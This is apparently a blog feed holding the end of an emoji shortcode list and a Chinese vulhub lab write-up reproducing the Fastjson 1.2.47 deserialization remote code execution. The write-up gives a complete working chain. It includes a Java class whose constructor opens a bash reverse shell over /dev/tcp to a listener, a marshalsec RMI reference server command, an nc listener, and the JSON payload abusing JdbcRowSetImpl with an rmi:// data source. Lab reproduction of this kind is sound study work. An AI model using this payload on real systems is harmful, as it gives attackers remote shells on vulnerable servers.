class="hljs-symbol">:triangular_ruler</span>:📕<span class="hljs-symbol">:closed_book</span>:📗<span class="hljs-symbol">:green_book</span>:<br>📘<span class="hljs-symbol">:blue_book</span>:📙<span class="hljs-symbol">:orange_book</span>:📓<span class="hljs-symbol">:notebook</span>:<br>📔<span class="hljs-symbol">:notebook_with_decorative_cover</span>:📒<span class="hljs-symbol">:ledger</span>:📚<span class="hljs-symbol">:books</span>:<br>🔖<span class="hljs-symbol">:bookmark</span>:📛<span class="hljs-symbol">:name_badge</span>:🔬<span class="hljs-symbol">:microscope</span>:<br>🔭<span class="hljs-symbol">:telescope</span>:📰<span class="hljs-symbol">:newspaper</span>:🏈<span class="hljs-symbol">:football</span>:<br>🏀<span class="hljs-symbol">:basketball</span>:⚽️<span class="hljs-symbol">:soccer</span>:⚾️<span class="hljs-symbol">:baseball</span>:<br>🎾<span class="hljs-symbol">:tennis</span>:🎱<span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">ball:</span>🏉<span class="hljs-symbol">:rugby_football</span>:<br>🎳<span class="hljs-symbol">:bowling</span>:⛳️<span class="hljs-symbol">:golf</span>:🚵<span class="hljs-symbol">:mountain_bicyclist</span>:<br>🚴<span class="hljs-symbol">:bicyclist</span>:🏇<span class="hljs-symbol">:horse_racing</span>:🏂<span class="hljs-symbol">:snowboarder</span>:<br>🏊<span class="hljs-symbol">:swimmer</span>:🏄<span class="hljs-symbol">:surfer</span>:🎿<span class="hljs-symbol">:ski</span>:<br>♠️<span class="hljs-symbol">:spades</span>:♥️<span class="hljs-symbol">:hearts</span>:♣️<span class="hljs-symbol">:clubs</span>:<br>♦️<span class="hljs-symbol">:diamonds</span>:💎<span class="hljs-symbol">:gem</span>:💍<span class="hljs-symbol">:ring</span>:<br>🏆<span class="hljs-symbol">:trophy</span>:🎼<span class="hljs-symbol">:musical_score</span>:🎹<span class="hljs-symbol">:musical_keyboard</span>:<br>🎻<span class="hljs-symbol">:violin</span>:👾<span class="hljs-symbol">:space_invader</span>:🎮<span class="hljs-symbol">:video_game</span>:<br>🃏<span class="hljs-symbol">:black_joker</span>:🎴<span class="hljs-symbol">:flower_playing_cards</span>:🎲<span class="hljs-symbol">:game_die</span>:<br>🎯<span class="hljs-symbol">:dart</span>:🀄️<span class="hljs-symbol">:mahjong</span>:🎬<span class="hljs-symbol">:clapper</span>:<br>📝<span class="hljs-symbol">:memo</span>:📝<span class="hljs-symbol">:pencil</span>:📖<span class="hljs-symbol">:book</span>:<br>🎨<span class="hljs-symbol">:art</span>:🎤<span class="hljs-symbol">:microphone</span>:🎧<span class="hljs-symbol">:headphones</span>:<br>🎺<span class="hljs-symbol">:trumpet</span>:🎷<span class="hljs-symbol">:saxophone</span>:🎸<span class="hljs-symbol">:guitar</span>:<br>👞<span class="hljs-symbol">:shoe</span>:👡<span class="hljs-symbol">:sandal</span>:👠<span class="hljs-symbol">:high_heel</span>:<br>💄<span class="hljs-symbol">:lipstick</span>:👢<span class="hljs-symbol">:boot</span>:👕<span class="hljs-symbol">:shirt</span>:<br>👕<span class="hljs-symbol">:tshirt</span>:👔<span class="hljs-symbol">:necktie</span>:👚<span class="hljs-symbol">:womans_clothes</span>:<br>👗<span class="hljs-symbol">:dress</span>:🎽<span class="hljs-symbol">:running_shirt_with_sash</span>:👖<span class="hljs-symbol">:jeans</span>:<br>👘<span class="hljs-symbol">:kimono</span>:👙<span class="hljs-symbol">:bikini</span>:🎀<span class="hljs-symbol">:ribbon</span>:<br>🎩<span class="hljs-symbol">:tophat</span>:👑<span class="hljs-symbol">:crown</span>:👒<span class="hljs-symbol">:womans_hat</span>:<br>👞<span class="hljs-symbol">:mans_shoe</span>:🌂<span class="hljs-symbol">:closed_umbrella</span>:💼<span class="hljs-symbol">:briefcase</span>:<br>👜<span class="hljs-symbol">:handbag</span>:👝<span class="hljs-symbol">:pouch</span>:👛<span class="hljs-symbol">:purse</span>:<br>👓<span class="hljs-symbol">:eyeglasses</span>:🎣<span class="hljs-symbol">:fishing_pole_and_fish</span>:☕️<span class="hljs-symbol">:coffee</span>:<br>🍵<span class="hljs-symbol">:tea</span>:🍶<span class="hljs-symbol">:sake</span>:🍼<span class="hljs-symbol">:baby_bottle</span>:<br>🍺<span class="hljs-symbol">:beer</span>:🍻<span class="hljs-symbol">:beers</span>:🍸<span class="hljs-symbol">:cocktail</span>:<br>🍹<span class="hljs-symbol">:tropical_drink</span>:🍷<span class="hljs-symbol">:wine_glass</span>:🍴<span class="hljs-symbol">:fork_and_knife</span>:<br>🍕<span class="hljs-symbol">:pizza</span>:🍔<span class="hljs-symbol">:hamburger</span>:🍟<span class="hljs-symbol">:fries</span>:<br>🍗<span class="hljs-symbol">:poultry_leg</span>:🍖<span class="hljs-symbol">:meat_on_bone</span>:🍝<span class="hljs-symbol">:spaghetti</span>:<br>🍛<span class="hljs-symbol">:curry</span>:🍤<span class="hljs-symbol">:fried_shrimp</span>:🍱<span class="hljs-symbol">:bento</span>:<br>🍣<span class="hljs-symbol">:sushi</span>:🍥<span class="hljs-symbol">:fish_cake</span>:🍙<span class="hljs-symbol">:rice_ball</span>:<br>🍘<span class="hljs-symbol">:rice_cracker</span>:🍚<span class="hljs-symbol">:rice</span>:🍜<span class="hljs-symbol">:ramen</span>:<br>🍲<span class="hljs-symbol">:stew</span>:🍢<span class="hljs-symbol">:oden</span>:🍡<span class="hljs-symbol">:dango</span>:<br>🥚<span class="hljs-symbol">:egg</span>:🍞<span class="hljs-symbol">:bread</span>:🍩<span class="hljs-symbol">:doughnut</span>:<br>🍮<span class="hljs-symbol">:custard</span>:🍦<span class="hljs-symbol">:icecream</span>:🍨<span class="hljs-symbol">:ice_cream</span>:<br>🍧<span class="hljs-symbol">:shaved_ice</span>:🎂<span class="hljs-symbol">:birthday</span>:🍰<span class="hljs-symbol">:cake</span>:<br>🍪<span class="hljs-symbol">:cookie</span>:🍫<span class="hljs-symbol">:chocolate_bar</span>:🍬<span class="hljs-symbol">:candy</span>:<br>🍭<span class="hljs-symbol">:lollipop</span>:🍯<span class="hljs-symbol">:honey_pot</span>:🍎<span class="hljs-symbol">:apple</span>:<br>🍏<span class="hljs-symbol">:green_apple</span>:🍊<span class="hljs-symbol">:tangerine</span>:🍋<span class="hljs-symbol">:lemon</span>:<br>🍒<span class="hljs-symbol">:cherries</span>:🍇<span class="hljs-symbol">:grapes</span>:🍉<span class="hljs-symbol">:watermelon</span>:<br>🍓<span class="hljs-symbol">:strawberry</span>:🍑<span class="hljs-symbol">:peach</span>:🍈<span class="hljs-symbol">:melon</span>:<br>🍌<span class="hljs-symbol">:banana</span>:🍐<span class="hljs-symbol">:pear</span>:🍍<span class="hljs-symbol">:pineapple</span>:<br>🍠<span class="hljs-symbol">:sweet_potato</span>:🍆<span class="hljs-symbol">:eggplant</span>:🍅<span class="hljs-symbol">:tomato</span>:<br>🌽<span class="hljs-symbol">:corn</span>:<br><br><span class="hljs-title class_">Places</span><br>🏠<span class="hljs-symbol">:house</span>:🏡<span class="hljs-symbol">:house_with_garden</span>:🏫<span class="hljs-symbol">:school</span>:<br>🏢<span class="hljs-symbol">:office</span>:🏣<span class="hljs-symbol">:post_office</span>:🏥<span class="hljs-symbol">:hospital</span>:<br>🏦<span class="hljs-symbol">:bank</span>:🏪<span class="hljs-symbol">:convenience_store</span>:🏩<span class="hljs-symbol">:love_hotel</span>:<br>🏨<span class="hljs-symbol">:hotel</span>:💒<span class="hljs-symbol">:wedding</span>:⛪️<span class="hljs-symbol">:church</span>:<br>🏬<span class="hljs-symbol">:department_store</span>:🏤<span class="hljs-symbol">:european_post_office</span>:🌇<span class="hljs-symbol">:city_sunrise</span>:<br>🌆<span class="hljs-symbol">:city_sunset</span>:🏯<span class="hljs-symbol">:japanese_castle</span>:🏰<span class="hljs-symbol">:european_castle</span>:<br>⛺️<span class="hljs-symbol">:tent</span>:🏭<span class="hljs-symbol">:factory</span>:🗼<span class="hljs-symbol">:tokyo_tower</span>:<br>🗾<span class="hljs-symbol">:japan</span>:🗻<span class="hljs-symbol">:mount_fuji</span>:🌄<span class="hljs-symbol">:sunrise_over_mountains</span>:<br>🌅<span class="hljs-symbol">:sunrise</span>:🌠<span class="hljs-symbol">:stars</span>:🗽<span class="hljs-symbol">:statue_of_liberty</span>:<br>🌉<span class="hljs-symbol">:bridge_at_night</span>:🎠<span class="hljs-symbol">:carousel_horse</span>:🌈<span class="hljs-symbol">:rainbow</span>:<br>🎡<span class="hljs-symbol">:ferris_wheel</span>:⛲️<span class="hljs-symbol">:fountain</span>:🎢<span class="hljs-symbol">:roller_coaster</span>:<br>🚢<span class="hljs-symbol">:ship</span>:🚤<span class="hljs-symbol">:speedboat</span>:⛵️<span class="hljs-symbol">:boat</span>:<br>⛵️<span class="hljs-symbol">:sailboat</span>:🚣<span class="hljs-symbol">:rowboat</span>:⚓️<span class="hljs-symbol">:anchor</span>:<br>🚀<span class="hljs-symbol">:rocket</span>:✈️<span class="hljs-symbol">:airplane</span>:🚁<span class="hljs-symbol">:helicopter</span>:<br>🚂<span class="hljs-symbol">:steam_locomotive</span>:🚊<span class="hljs-symbol">:tram</span>:🚞<span class="hljs-symbol">:mountain_railway</span>:<br>🚲<span class="hljs-symbol">:bike</span>:🚡<span class="hljs-symbol">:aerial_tramway</span>:🚟<span class="hljs-symbol">:suspension_railway</span>:<br>🚠<span class="hljs-symbol">:mountain_cableway</span>:🚜<span class="hljs-symbol">:tractor</span>:🚙<span class="hljs-symbol">:blue_car</span>:<br>🚘<span class="hljs-symbol">:oncoming_automobile</span>:🚗<span class="hljs-symbol">:car</span>:🚗<span class="hljs-symbol">:red_car</span>:<br>🚕<span class="hljs-symbol">:taxi</span>:🚖<span class="hljs-symbol">:oncoming_taxi</span>:🚛<span class="hljs-symbol">:articulated_lorry</span>:<br>🚌<span class="hljs-symbol">:bus</span>:🚍<span class="hljs-symbol">:oncoming_bus</span>:🚨<span class="hljs-symbol">:rotating_light</span>:<br>🚓<span class="hljs-symbol">:police_car</span>:🚔<span class="hljs-symbol">:oncoming_police_car</span>:🚒<span class="hljs-symbol">:fire_engine</span>:<br>🚑<span class="hljs-symbol">:ambulance</span>:🚐<span class="hljs-symbol">:minibus</span>:🚚<span class="hljs-symbol">:truck</span>:<br>🚋<span class="hljs-symbol">:train</span>:🚉<span class="hljs-symbol">:station</span>:🚆<span class="hljs-symbol">:train2</span>:<br>🚅<span class="hljs-symbol">:bullettrain_front</span>:🚄<span class="hljs-symbol">:bullettrain_side</span>:🚈<span class="hljs-symbol">:light_rail</span>:<br>🚝<span class="hljs-symbol">:monorail</span>:🚃<span class="hljs-symbol">:railway_car</span>:🚎<span class="hljs-symbol">:trolleybus</span>:<br>🎫<span class="hljs-symbol">:ticket</span>:⛽️<span class="hljs-symbol">:fuelpump</span>:🚦<span class="hljs-symbol">:vertical_traffic_light</span>:<br>🚥<span class="hljs-symbol">:traffic_light</span>:⚠️<span class="hljs-symbol">:warning</span>:🚧<span class="hljs-symbol">:construction</span>:<br>🔰<span class="hljs-symbol">:beginner</span>:🏧<span class="hljs-symbol">:atm</span>:🎰<span class="hljs-symbol">:slot_machine</span>:<br>🚏<span class="hljs-symbol">:busstop</span>:💈<span class="hljs-symbol">:barber</span>:♨️<span class="hljs-symbol">:hotsprings</span>:<br>🏁<span class="hljs-symbol">:checkered_flag</span>:🎌<span class="hljs-symbol">:crossed_flags</span>:🏮<span class="hljs-symbol">:izakaya_lantern</span>:<br>🗿<span class="hljs-symbol">:moyai</span>:🎪<span class="hljs-symbol">:circus_tent</span>:🎭<span class="hljs-symbol">:performing_arts</span>:<br>📍<span class="hljs-symbol">:round_pushpin</span>:🚩<span class="hljs-symbol">:triangular_flag_on_post</span>:<br><br><span class="hljs-title class_">Symbols</span><br><span class="hljs-number">1</span>️⃣<span class="hljs-symbol">:one</span>:<span class="hljs-number">2</span>️⃣<span class="hljs-symbol">:two</span>:<span class="hljs-number">3</span>️⃣<span class="hljs-symbol">:three</span>:<br><span class="hljs-number">4</span>️⃣<span class="hljs-symbol">:four</span>:<span class="hljs-number">5</span>️⃣<span class="hljs-symbol">:five</span>:<span class="hljs-number">6</span>️⃣<span class="hljs-symbol">:six</span>:<br><span class="hljs-number">7</span>️⃣<span class="hljs-symbol">:seven</span>:<span class="hljs-number">8</span>️⃣<span class="hljs-symbol">:eight</span>:<span class="hljs-number">9</span>️⃣<span class="hljs-symbol">:nine</span>:<br>🔟<span class="hljs-symbol">:keycap_ten</span>:🔢<span class="hljs-symbol">:</span><span class="hljs-number">1234</span>:<span class="hljs-number">0</span>️⃣<span class="hljs-symbol">:zero</span>:<br><span class="hljs-comment">#️⃣:hash:🔣:symbols:◀️:arrow_backward:</span><br>⬇️<span class="hljs-symbol">:arrow_down</span>:▶️<span class="hljs-symbol">:arrow_forward</span>:⬅️<span class="hljs-symbol">:arrow_left</span>:<br>🔠<span class="hljs-symbol">:capital_abcd</span>:🔡<span class="hljs-symbol">:abcd</span>:🔤<span class="hljs-symbol">:abc</span>:<br>↙️<span class="hljs-symbol">:arrow_lower_left</span>:↘️<span class="hljs-symbol">:arrow_lower_right</span>:➡️<span class="hljs-symbol">:arrow_right</span>:<br>⬆️<span class="hljs-symbol">:arrow_up</span>:↖️<span class="hljs-symbol">:arrow_upper_left</span>:↗️<span class="hljs-symbol">:arrow_upper_right</span>:<br>⏬<span class="hljs-symbol">:arrow_double_down</span>:⏫<span class="hljs-symbol">:arrow_double_up</span>:🔽<span class="hljs-symbol">:arrow_down_small</span>:<br>⤵️<span class="hljs-symbol">:arrow_heading_down</span>:⤴️<span class="hljs-symbol">:arrow_heading_up</span>:↩️<span class="hljs-symbol">:leftwards_arrow_with_hook</span>:<br>↪️<span class="hljs-symbol">:arrow_right_hook</span>:↔️<span class="hljs-symbol">:left_right_arrow</span>:↕️<span class="hljs-symbol">:arrow_up_down</span>:<br>🔼<span class="hljs-symbol">:arrow_up_small</span>:🔃<span class="hljs-symbol">:arrows_clockwise</span>:🔄<span class="hljs-symbol">:arrows_counterclockwise</span>:<br>⏪<span class="hljs-symbol">:rewind</span>:⏩<span class="hljs-symbol">:fast_forward</span>:ℹ️<span class="hljs-symbol">:information_source</span>:<br>🆗<span class="hljs-symbol">:ok</span>:🔀<span class="hljs-symbol">:twisted_rightwards_arrows</span>:🔁<span class="hljs-symbol">:repeat</span>:<br>🔂<span class="hljs-symbol">:repeat_one</span>:🆕<span class="hljs-symbol">:new</span>:🔝<span class="hljs-symbol">:top</span>:<br>🆙<span class="hljs-symbol">:up</span>:🆒<span class="hljs-symbol">:cool</span>:🆓<span class="hljs-symbol">:free</span>:<br>🆖<span class="hljs-symbol">:ng</span>:🎦<span class="hljs-symbol">:cinema</span>:🈁<span class="hljs-symbol">:koko</span>:<br>📶<span class="hljs-symbol">:signal_strength</span>:<br>🈂️<span class="hljs-symbol">:sa</span>:🚻<span class="hljs-symbol">:restroom</span>:🚹<span class="hljs-symbol">:mens</span>:<br>🚺<span class="hljs-symbol">:womens</span>:🚼<span class="hljs-symbol">:baby_symbol</span>:🚭<span class="hljs-symbol">:no_smoking</span>:<br>🅿️<span class="hljs-symbol">:parking</span>:♿️<span class="hljs-symbol">:wheelchair</span>:🚇<span class="hljs-symbol">:metro</span>:<br>🛄<span class="hljs-symbol">:baggage_claim</span>:🉑<span class="hljs-symbol">:accept</span>:🚾<span class="hljs-symbol">:wc</span>:<br>🚰<span class="hljs-symbol">:potable_water</span>:🚮<span class="hljs-symbol">:put_litter_in_its_place</span>:㊙️<span class="hljs-symbol">:secret</span>:<br>㊗️<span class="hljs-symbol">:congratulations</span>:Ⓜ️<span class="hljs-symbol">:m</span>:🛂<span class="hljs-symbol">:passport_control</span>:<br>🛅<span class="hljs-symbol">:left_luggage</span>:🛃<span class="hljs-symbol">:customs</span>:🉐<span class="hljs-symbol">:ideograph_advantage</span>:<br>🆑<span class="hljs-symbol">:cl</span>:🆘<span class="hljs-symbol">:sos</span>:🆔<span class="hljs-symbol">:id</span>:<br>🚫<span class="hljs-symbol">:no_entry_sign</span>:🔞<span class="hljs-symbol">:underage</span>:📵<span class="hljs-symbol">:no_mobile_phones</span>:<br>🚯<span class="hljs-symbol">:do_not_litter</span>:🚱<span class="hljs-symbol">:non-potable_water</span>:🚳<span class="hljs-symbol">:no_bicycles</span>:<br>🚷<span class="hljs-symbol">:no_pedestrians</span>:🚸<span class="hljs-symbol">:children_crossing</span>:⛔️<span class="hljs-symbol">:no_entry</span>:<br>✳️<span class="hljs-symbol">:eight_spoked_asterisk</span>:✴️<span class="hljs-symbol">:eight_pointed_black_star</span>:💟<span class="hljs-symbol">:heart_decoration</span>:<br>🆚<span class="hljs-symbol">:vs</span>:📳<span class="hljs-symbol">:vibration_mode</span>:📴<span class="hljs-symbol">:mobile_phone_off</span>:<br>💹<span class="hljs-symbol">:chart</span>:💱<span class="hljs-symbol">:currency_exchange</span>:♈️<span class="hljs-symbol">:aries</span>:<br>♉️<span class="hljs-symbol">:taurus</span>:♊️<span class="hljs-symbol">:gemini</span>:♋️<span class="hljs-symbol">:cancer</span>:<br>♌️<span class="hljs-symbol">:leo</span>:♍️<span class="hljs-symbol">:virgo</span>:♎️<span class="hljs-symbol">:libra</span>:<br>♏️<span class="hljs-symbol">:scorpius</span>:♐️<span class="hljs-symbol">:sagittarius</span>:♑️<span class="hljs-symbol">:capricorn</span>:<br>♒️<span class="hljs-symbol">:aquarius</span>:♓️<span class="hljs-symbol">:pisces</span>:⛎<span class="hljs-symbol">:ophiuchus</span>:<br>🔯<span class="hljs-symbol">:six_pointed_star</span>:❎<span class="hljs-symbol">:negative_squared_cross_mark</span>:🅰️<span class="hljs-symbol">:a</span>:<br>🅱️<span class="hljs-symbol">:b</span>:🆎<span class="hljs-symbol">:ab</span>:🅾️<span class="hljs-symbol">:o2</span>:<br>💠<span class="hljs-symbol">:diamond_shape_with_a_dot_inside</span>:♻️<span class="hljs-symbol">:recycle</span>:🔚<span class="hljs-symbol">:end</span>:<br>🔛<span class="hljs-symbol">:on</span>:🔜<span class="hljs-symbol">:soon</span>:🕐<span class="hljs-symbol">:clock1</span>:<br>🕜<span class="hljs-symbol">:clock130</span>:🕙<span class="hljs-symbol">:clock10</span>:🕥<span class="hljs-symbol">:clock1030</span>:<br>🕚<span class="hljs-symbol">:clock11</span>:🕦<span class="hljs-symbol">:clock1130</span>:🕛<span class="hljs-symbol">:clock12</span>:<br>🕧<span class="hljs-symbol">:clock1230</span>:🕑<span class="hljs-symbol">:clock2</span>:🕝<span class="hljs-symbol">:clock230</span>:<br>🕒<span class="hljs-symbol">:clock3</span>:🕞<span class="hljs-symbol">:clock330</span>:🕓<span class="hljs-symbol">:clock4</span>:<br>🕟<span class="hljs-symbol">:clock430</span>:🕔<span class="hljs-symbol">:clock5</span>:🕠<span class="hljs-symbol">:clock530</span>:<br>🕕<span class="hljs-symbol">:clock6</span>:🕡<span class="hljs-symbol">:clock630</span>:🕖<span class="hljs-symbol">:clock7</span>:<br>🕢<span class="hljs-symbol">:clock730</span>:🕗<span class="hljs-symbol">:clock8</span>:🕣<span class="hljs-symbol">:clock830</span>:<br>🕘<span class="hljs-symbol">:clock9</span>:🕤<span class="hljs-symbol">:clock930</span>:💲<span class="hljs-symbol">:heavy_dollar_sign</span>:<br>©️<span class="hljs-symbol">:copyright</span>:®️<span class="hljs-symbol">:registered</span>:™️<span class="hljs-symbol">:tm</span>:<br>❌<span class="hljs-symbol">:x</span>:❗️<span class="hljs-symbol">:heavy_exclamation_mark</span>:‼️<span class="hljs-symbol">:bangbang</span>:<br>⁉️<span class="hljs-symbol">:interrobang</span>:⭕️<span class="hljs-symbol">:o</span>:✖️<span class="hljs-symbol">:heavy_multiplication_x</span>:<br>➕<span class="hljs-symbol">:heavy_plus_sign</span>:➖<span class="hljs-symbol">:heavy_minus_sign</span>:➗<span class="hljs-symbol">:heavy_division_sign</span>:<br>💮<span class="hljs-symbol">:white_flower</span>:💯<span class="hljs-symbol">:</span><span class="hljs-number">100</span>:✔️<span class="hljs-symbol">:heavy_check_mark</span>:<br>☑️<span class="hljs-symbol">:ballot_box_with_check</span>:🔘<span class="hljs-symbol">:radio_button</span>:🔗<span class="hljs-symbol">:link</span>:<br>➰<span class="hljs-symbol">:curly_loop</span>:〰️<span class="hljs-symbol">:wavy_dash</span>:〽️<span class="hljs-symbol">:part_alternation_mark</span>:<br>🔱<span class="hljs-symbol">:trident</span>:🔻<span class="hljs-symbol">:small_red_triangle_down</span>:🔺<span class="hljs-symbol">:small_red_triangle</span>:<br>✅<span class="hljs-symbol">:white_check_mark</span>:🔲<span class="hljs-symbol">:black_square_button</span>:🔳<span class="hljs-symbol">:white_square_button</span>:<br>⚫️<span class="hljs-symbol">:black_circle</span>:⚪️<span class="hljs-symbol">:white_circle</span>:🔴<span class="hljs-symbol">:red_circle</span>:<br>🔵<span class="hljs-symbol">:large_blue_circle</span>:🔷<span class="hljs-symbol">:large_blue_diamond</span>:🔶<span class="hljs-symbol">:large_orange_diamond</span>:<br>🔹<span class="hljs-symbol">:small_blue_diamond</span>:🔸<span class="hljs-symbol">:small_orange_diamond</span>:<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>个人博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson反序列化漏洞vulhub靶场复现</title>
    <link href="/posts/13d6b9a5.html"/>
    <url>/posts/13d6b9a5.html</url>
    
    <content type="html"><![CDATA[<h2 id="Fastjson简介"><a class="header-anchor" href="#Fastjson简介">¶</a>Fastjson简介</h2><p>​Fastjson是java的一个库，可以将java对象转化为json格式的字符串，也可以将json格式的字符串转化为java对象 提供了 <code>toJSONString()</code> 和 <code>parseObject()</code> 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串转换成对象。</p><h2 id="反序列化漏洞原理"><a class="header-anchor" href="#反序列化漏洞原理">¶</a>反序列化漏洞原理</h2><p>在反序列化的时候，会进入parseField方法，进入该方法后，就会调用setValue(object, value)方法，在这里，会执行构造的恶意代码，最后造成代码执行。 那么通过以上步骤，我们可以知道该漏洞的利用点有两个，第一是需要我们指定一个类，这个类的作用是为了让程序获取这个类来进行反序列化操作。第二是需要将需要执行的代码提供给程序，所以这里使用了rmi。 然后反序列化的时候会去请求rmi服务器，地址为： <a href="http://dnslog.cn/aaa%E3%80%82%E7%84%B6%E5%90%8E%E5%8A%A0%E8%BD%BDaaa%E8%BF%99%E4%B8%AA%E6%81%B6%E6%84%8Fclass%E6%96%87%E4%BB%B6%E4%BB%8E%E8%80%8C%E9%80%A0%E6%88%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%82">dnslog.cn/aaa。然后加载aaa这个恶意class文件从而造成代码执行。</a></p><h2 id="利用条件"><a class="header-anchor" href="#利用条件">¶</a>利用条件</h2><ol><li><p>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；</p></li><li><p>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。</p></li><li><p>目标服务器存在fastjson。</p></li><li><p>没有对用户传输的数据进行严格过滤。</p></li></ol><h2 id="漏洞复现"><a class="header-anchor" href="#漏洞复现">¶</a>漏洞复现</h2><p>Target machine：192.168.172.136  --&gt;kali</p><p>Attack machine：192.168.3.126 --&gt;windows</p><h4 id="搭建靶场"><a class="header-anchor" href="#搭建靶场">¶</a>搭建靶场</h4><p>进入vulhub相关目录下开启靶场并进行访问。</p><blockquote><p>靶场搭建需要用到docker和docker-compose以及vulhub相关靶场文件有关docker的搭建和docker-compose 的下载参考网上相关文献，这里不写，就是单纯的懒┗( ▔, ▔ )┛</p><p>docker-compose链接：<a href="https://github.com/docker/compose/releases">https://github.com/docker/compose/releases</a></p><p>vulhub链接：<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p></blockquote><p>靶场目录：vulhub-master/fastjson/1.2.47-rce</p><p>在该目录下利用docker-compose启动靶场：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d      <br>docker<br></code></pre></td></tr></table></figure><img src="/posts/13d6b9a5/image-20230630170317323-1688115809298-1.png" class title="image"><p>访问地址：192.168.172.136:8090</p><h3 id="打靶"><a class="header-anchor" href="#打靶">¶</a>打靶</h3><p>利用Burpsuite抓包，修改请求方式、请求正文以及正文类型，判断是否为fastjson框架，如果是fastjson框架，请求包中应该有一个严格的格式才能解析，否则会报错！</p><img src="/posts/13d6b9a5/Snipaste_2023-06-29_15-26-04-1688116212839-4.png" class title="image"><p>准备一个恶意的java类<code>Exploit.java</code>并用javac编译rmi.java文件，生成一个类文件<code>Exploit.class</code></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exploit</span>()</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.172.129/6666 0&gt;&amp;1&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] argv</span>)</span>&#123;<br>        Exploit e = <span class="hljs-keyword">new</span> Exploit();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//这里的ip地址要改为另外一台kali的ip地址，之后该kali要在6666端口开启nc监听</span><br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">javac Exploit.java    <span class="hljs-regexp">//</span>执行命令<br></code></pre></td></tr></table></figure><p>从github上下载：marshalsec-jar</p><p>工具地址：<a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><img src="/posts/13d6b9a5/Snipaste_2023-06-29_16-07-50.png" class title="image"><p>然后将以上三个文件放到同一个文件夹。</p><p>在当前文件夹下打开cmd利用python开启简易http服务器，浏览器访问验证。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># HTTPServer</span><br>python2 -m SimpleHTTPServer <span class="hljs-number">8000</span>    <span class="hljs-regexp">//</span>这里只能用python2，python3无法打开<br></code></pre></td></tr></table></figure><img src="/posts/13d6b9a5/Snipaste_2023-06-29_16-09-03-1688116886915-8.png" class title="image"><p>启动rmi服务器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://192.168.3.126:8000/#Exploit&quot;</span> <span class="hljs-number">9999</span>  <br></code></pre></td></tr></table></figure><img src="/posts/13d6b9a5/image-20230630172223928-1688116946388-10.png" class title="image"><blockquote><p>在哪台机器上编译的java恶意类就要在哪台机器上启动RMI服务器</p></blockquote><p>在kali中开启nc监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p>访问漏洞网站并使用BP抓包且将GET请求修改为POST请求，反弹shell的POC如下（要记得Content-Type改为: application/json，否则不成功）发送请求。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://192.168.3.105:9999/Exploit&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img 